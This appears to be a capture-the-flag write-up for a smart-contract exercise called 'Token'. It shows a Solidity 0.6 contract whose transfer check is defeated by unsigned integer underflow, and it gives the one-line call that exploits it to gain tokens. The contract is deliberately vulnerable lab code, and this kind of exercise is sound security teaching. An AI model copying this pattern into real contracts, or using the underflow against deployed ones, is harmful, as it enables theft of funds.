## 5. Token

Goal for this exercise is:

- Manage to get your hands on any additional tokens (Player starts with 20 tokens)


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
~~~



Contract is vulnerable to underflow.

Needed call was:

- `contract.transfer(instance, 21)`
